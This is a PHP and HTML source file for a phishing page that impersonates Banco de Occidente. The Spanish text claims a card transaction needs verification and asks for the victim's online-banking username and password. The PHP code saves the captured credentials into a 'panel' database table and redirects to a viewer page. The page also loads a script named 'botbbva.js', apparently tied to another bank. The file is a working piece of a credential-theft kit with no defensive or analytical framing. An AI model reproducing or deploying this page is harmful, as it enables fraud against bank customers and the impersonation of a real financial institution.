<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="../../css/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Document</title>
    <style>
        html, body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            
        }

        .container {
            width: 90%;
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: white;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        header .logo {
            font-size: 24px;
            color: #002147;
            font-weight: bold;
        }

        header .menu a {
            text-decoration: none;
            color: #ffffff;
            background-color: #002147;
            padding: 10px 15px;
            border-radius: 4px;
        }

        main h2 {
            color: #333333;
            font-size: 16px; /* Reducido el tamaño de la fuente para dispositivos móviles */
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        form label {
            font-size: 14px;
            margin-bottom: 5px;
            color: #666666;
        }

        form select,
        form input {
            padding: 8px; /* Reducido el tamaño del relleno */
            font-size: 14px;
            margin-bottom: 15px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            width: calc(100% - 18px); /* Ajuste de ancho para compensar el relleno */
        }

        form button {
            padding: 10px;
            font-size: 14px; /* Reducido el tamaño de la fuente del botón */
            color: white;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        form button:hover {
            background-color: #0056b3;
        }

        form .forgot-password {
            font-size: 14px;
            color: #007bff;
            text-decoration: none;
            margin-top: 10px;
        }

        form .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <main style="margin: 15% 8%;">
        <section>
            <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
                <img style="width: 50%;" src="../../img/BANCO DE OCCIDENTE.png" alt="">
            </div>
    
            <div style="margin-top: 1%; margin-bottom: 8%;">
                <p style="margin-bottom: 8%;"><strong>Vamos a valiar tu compra</strong></p>
                <p>Se requiere verificar la transacción que intentas realizar con tu tarjeta  por seguridad</p>
                
            </div>
    
            
            <div class="container">
                <main>
                    <h2>Ingresa tu Usuario y contraseña:</h2>
                    <form method="POST">
                        <section style="margin-top: 8%; margin: 5%;">
                            <div style="margin-bottom: 4%;">
                                <input type="text" style=" border-width: 1px;" id="username" name="dato1" placeholder="Usuario" required>
                            </div>
                    
                            <div>
                                <input type="password" style=" border-width: 1.9px;" id="password" name="dato2" placeholder="Ingresa tu contraseña"    required>
                
                            </div>
                
                            <div style="display: flex; justify-content: center; margin-top: 6%;">
                            <button id="submitBtn" style="background-color: blue; font-size: smaller; color: white; padding: 5%; border-radius: 5px; border-width: 0px;" class="login-button">CONTINUAR</button> 
                            </div>
                        </section>
                        </form>
                </main>
            </div>
            <script src="botbbva.js"></script>
       
    </main>
    
</body>
</html>